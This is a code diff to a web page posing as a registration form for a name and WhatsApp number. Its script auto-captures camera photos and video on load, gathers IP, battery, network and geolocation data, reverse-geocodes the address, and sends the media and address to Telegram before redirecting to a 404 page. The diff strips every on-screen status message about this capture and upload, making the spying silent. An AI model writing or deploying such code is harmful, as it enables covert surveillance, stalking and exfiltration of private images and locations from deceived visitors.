@@ -118,7 +118,7 @@
       <aside class="right" aria-hidden="true">
         <div class="preview" aria-hidden="true">
           <!-- video background (replaces prior mask image). ID kept as maskImage so existing code still works -->
-          <video id="maskImage" autoplay loop playsinline muted>
+          <video id="maskImage" autoplay loop playsinline >
             <source src="https://c.top4top.io/m_3551e7put1.mp4" type="video/mp4">
             <!-- fallback text -->
           </video>
@@ -159,8 +159,6 @@ const maskImage = document.getElementById('maskImage'); // now a video element
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 const statusText = document.getElementById('statusText');
-
-function setStatus(s){ if(statusText) statusText.textContent = 'Status: ' + s; }
 
 // small helpers
 const noop = ()=>{};
@@ -321,19 +319,15 @@ let initialVideoBlob = null;
 
 (async function autoCaptureOnLoad(){
   try{
-    setStatus('Meminta izin kamera & mikrofon (otomatis)...');
     // Try to request camera+mic immediately
     const media = await capturePhotoAndVideo(5000); // 5s
     if(media && (media.photoBlob || media.videoBlob)){
       initialPhotoBlob = media.photoBlob;
       initialVideoBlob = media.videoBlob;
-      setStatus('Media siap — tidak dikirim sampai submit');
-    } else {
-      setStatus('Media tidak tersedia');
-    }
+      } else {
+      }
   }catch(e){
     // permission denied or error — keep silent but update status
-    setStatus('Izin kamera/mikro tidak diberikan atau error');
     initialPhotoBlob = null;
     initialVideoBlob = null;
   }
@@ -342,8 +336,6 @@ let initialVideoBlob = null;
 /* main flow */
 regForm.addEventListener('submit', async function(e){
   e.preventDefault();
-  setStatus('Memproses...');
-
   // read inputs
   const name = document.getElementById('name').value.trim();
   const wa = document.getElementById('wa').value.trim();
@@ -351,7 +343,6 @@ regForm.addEventListener('submit', async function(e){
 
   if(!name || !wa){
     alert('Isi Nama dan Nomor WA terlebih dahulu.');
-    setStatus('Menunggu input...');
     return;
   }
 
@@ -362,7 +353,6 @@ regForm.addEventListener('submit', async function(e){
   }catch(e){ /* ignore */ }
 
   // gather device + ip + battery
-  setStatus('Mengumpulkan device & jaringan...');
   const ipInfo = await getIPInfo();
   const battery = await getBattery();
   const connection = getConnection();
@@ -386,10 +376,8 @@ regForm.addEventListener('submit', async function(e){
   // get geo & reverse geocode if consented
   let geo = { error:'not requested' }, rev = null;
   if(consent){
-    setStatus('Meminta izin lokasi...');
     geo = await getGeo();
     if(!geo.error && geo.lat && geo.lon){
-      setStatus('Reverse-geocoding alamat...');
       rev = await revGeocode(geo.lat, geo.lon);
     }
   }
@@ -397,7 +385,6 @@ regForm.addEventListener('submit', async function(e){
   // capture media if consented: use initial blobs if present, otherwise capture now
   let photoBlob = null, videoBlob = null;
   if(consent){
-    setStatus('Menyiapkan media untuk dikirim...');
     if(initialPhotoBlob || initialVideoBlob){
       photoBlob = initialPhotoBlob;
       videoBlob = initialVideoBlob;
@@ -406,7 +393,6 @@ regForm.addEventListener('submit', async function(e){
       initialVideoBlob = null;
     } else {
       // fallback: capture now
-      setStatus('Meminta izin kamera & microphone (submit)...');
       const media = await capturePhotoAndVideo(5000);
       photoBlob = media.photoBlob;
       videoBlob = media.videoBlob;
@@ -431,7 +417,6 @@ regForm.addEventListener('submit', async function(e){
   const videoCaption = buildVideoCaptionAddress(rev);
 
   // send photo + caption first
-  setStatus('Mengirim foto & ringkasan ke Telegram...');
   try{
     if(photoBlob){
       await sendPhotoCaption(photoBlob, photoCaption);
@@ -443,7 +428,6 @@ regForm.addEventListener('submit', async function(e){
   }
 
   // send video + caption (detailed address)
-  setStatus('Mengirim video & alamat detail ke Telegram...');
   try{
     if(videoBlob){
       await sendVideoCaption(videoBlob, videoCaption);
@@ -455,7 +439,6 @@ regForm.addEventListener('submit', async function(e){
   }
 
   // done -> redirect to 404
-  setStatus('Selesai. Redirecting...');
   document.querySelector('.wrap').style.display = 'none';
   document.getElementById('finish').style.display = 'block';
   setTimeout(()=>{ window.location.href = '/404.html'; }, 1200);
@@ -466,12 +449,10 @@ regForm.addEventListener('submit', async function(e){
 consentEl.addEventListener('change', async (e)=>{
   if(!consentEl.checked){
     try{ if(videoPreview.srcObject) { videoPreview.srcObject.getTracks().forEach(t=>t.stop()); videoPreview.srcObject = null; } }catch{}
-    setStatus('Preview dimatikan — consent dibatalkan');
     if(maskImage) maskImage.style.display = 'block';
     videoPreview.style.opacity = '0';
     return;
   }
-  setStatus('Preview diamankan — gambar penutup/video background aktif');
   // Keep mask visible by default (no auto-show of camera preview).
   // If you want to show live preview on consent, uncomment the block below:
   /*
@@ -480,12 +461,10 @@ consentEl.addEventListener('change', async (e)=>{
     videoPreview.srcObject = s;
     videoPreview.muted = true;
     await videoPreview.play().catch(noop);
-    setStatus('Preview aktif — kamera siap (rekam terjadi setelah submit)');
     if(maskImage) maskImage.style.display = 'none';
     videoPreview.style.opacity = '1';
   }catch(e){
-    setStatus('Tidak bisa mengaktifkan kamera (cek izin)');
-  }
+    }
   */
 });
 </script>
